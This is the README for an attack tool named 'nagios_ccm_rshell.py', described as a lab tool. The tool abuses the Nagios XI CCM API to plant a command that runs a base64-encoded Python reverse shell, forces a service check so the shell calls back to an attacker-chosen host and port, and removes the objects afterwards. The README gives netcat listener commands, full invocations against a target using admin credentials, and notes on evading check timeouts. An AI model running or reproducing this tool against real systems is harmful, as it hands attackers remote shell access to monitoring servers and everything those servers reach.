# nagios_ccm_rshell.py

Lab tool for the Nagios XI CCM command -> service RCE primitive. It creates a CCM command running a Python reverse shell, attaches it to a service, forces the check so the shell fires, and tears the objects back down. 

Stdlib only no pip installs.

## Listener and callback address

The shell is executed by the Nagios server, which connects back to
`--lhost:--lport`. Set `--lhost` to your listener's address as reachable from
the Nagios server:

- `127.0.0.1` (default) — you're catching on the Nagios host itself.
- `<your-ip>` — you're catching from another machine (use an address the
  Nagios server can route to).

Start the listener before `fire`:  `nc -lvnp 4444`

## Actions

| Action    | Does                                                      |
|-----------|----------------------------------------------------------|
| `setup`   | create the command + service, apply config               |
| `fire`    | force an immediate check (triggers the payload now)       |
| `status`  | show the service state / last check / plugin output       |
| `cleanup` | delete the service + command, apply config                |
| `all`     | `setup`, wait for the core to register it, then `fire`    |

## Commands

```bash
# catch on the host
nc -lvnp 4444

# set up + fire in one go
python3 nagios_ccm_rshell.py all

# or step by step
python3 nagios_ccm_rshell.py setup
python3 nagios_ccm_rshell.py fire
python3 nagios_ccm_rshell.py status

# remove the command and service
python3 nagios_ccm_rshell.py cleanup
```

## Flags

| Flag               | Default                         | Notes                                   |
|--------------------|---------------------------------|-----------------------------------------|
| `--lhost`          | `127.0.0.1`                     | connect back address, reachable from the Nagios server |
| `--lport`          | `4444`                          |                                         |
| `--monitored-host` | `localhost`                     | existing Nagios host OBJECT to attach to — **not** the server address (alias: `--host`) |
| `--service`        | `Reverse Shell Test`            | service description                      |
| `--command`        | `lab_rshell`                    | CCM command name                        |
| `--url`            | `http://127.0.0.1:8080/nagiosxi`| XI base URL — **must include `/nagiosxi`** (env `NAGIOSXI_URL`) |
| `--apikey`         | nagiosadmin key                 | env `NAGIOSXI_APIKEY`                    |
| `--check-interval` | `5`                             | service check interval (minutes)        |
| `--verify-tls`     | off (certs ignored)             | verify the server TLS cert; off by default so self-signed certs just work |
| `--proxy`          | env `NAGIOSXI_PROXY`            | route API traffic through a proxy        |
| `--burp`           | off                             | shorthand for `--proxy http://127.0.0.1:8080` |
| `-v, --verbose`    | off                             | print each request                       |

### Examples

Two flags people trip on:
- **`--url`** is the XI web base and **must include the `/nagiosxi` path**
  (e.g. `http://TARGET/nagiosxi`). Point it at the same address you log in at.
- **`--monitored-host`** is an existing Nagios **host object** to hang the
  service on (like `localhost`) — it is *not* the server's address.

TLS cert verification is off by default, so `https://` with a self-signed cert
works without extra flags.

```bash
# full run, everything explicit (username/password auth) — start a listener first:
#   nc -lvnp 4444
python3 nagios_ccm_rshell.py all --url http://TARGET/nagiosxi --username nagiosadmin --password '<password>' --monitored-host localhost --service "Reverse Shell Test" --command lab_rshell --template generic-service --contact-group xi_roles_1 --lhost <your-ip> --lport 4444

# tear it down afterwards (prompts for the password):
python3 nagios_ccm_rshell.py cleanup --url http://TARGET/nagiosxi --monitored-host localhost --service "Reverse Shell Test" --command lab_rshell --username nagiosadmin

# catch from another machine on a custom port
python3 nagios_ccm_rshell.py all --lhost 10.0.0.5 --lport 9001

# attach to a different host/service name
python3 nagios_ccm_rshell.py setup --monitored-host localhost --service "Disk Check" --command disk_rshell

# https target with a self-signed cert (TLS ignored by default)
python3 nagios_ccm_rshell.py all --url https://TARGET/nagiosxi --apikey <APIKEY> --lhost 10.0.0.1

# clean up a custom-named run
python3 nagios_ccm_rshell.py cleanup --service "Disk Check" --command disk_rshell
```

## Through Burp Suite

```bash
python3 nagios_ccm_rshell.py all --proxy http://127.0.0.1:8081
python3 nagios_ccm_rshell.py fire --burp          # shorthand for 127.0.0.1:8080
python3 nagios_ccm_rshell.py all --url https://... --burp   # https target (TLS ignored by default)
```

Env form:

```bash
export NAGIOSXI_PROXY=http://127.0.0.1:8081
python3 nagios_ccm_rshell.py all
```

## Notes

- Payload is a base64'd Python reverse shell run via `setsid`, so it survives Nagios reaping the check at `service_check_timeout` (60s). It runs as the `nagios` user, cwd `/tmp`.
- `command_line` avoids `;` and `$` (nagios config comment / macro characters).
- After `setup`, `fire` retries while the core finishes reloading.
- TLS certificate verification is off by default (self-signed certs just work); pass `--verify-tls` to enforce it.
